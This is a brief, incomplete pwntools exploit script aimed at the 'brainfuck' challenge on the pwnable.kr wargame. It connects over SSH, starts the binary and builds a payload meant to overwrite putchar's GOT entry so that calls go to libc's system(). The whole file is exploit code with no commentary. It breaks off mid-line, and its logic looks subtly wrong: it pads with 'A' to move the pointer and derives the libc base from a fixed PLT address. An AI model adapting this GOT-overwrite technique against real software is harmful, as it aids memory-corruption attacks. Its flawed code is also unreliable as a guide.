from pwn import *

sh = ssh(host='pwnable.kr', port=2222, user='brainfuck', password='guest')
p = sh.process('./brainfuck')

pointer_move_count = 0x0804a0a0 - 0x0804a030 # Number of times we need to move the pointer until the got plt of "putchar" (112)
putchar_addr = 0x080484d6
putchar_offset = 0x00061930
system_offset = 0x0003adb0
libc_base = putchar_addr - putchar_offset # Get libc base address from putchar offset
system_address = libc_base + system_offset

# system_offset = 0x0003adb0
payload = "A"*pointer_move_count
payload += "," # Overwrite got plt byte by byte
payload += ">" + ","
payload += ">" + ","
payload += ">" + ","

p.sendafter(b'instructions except [ ]', '
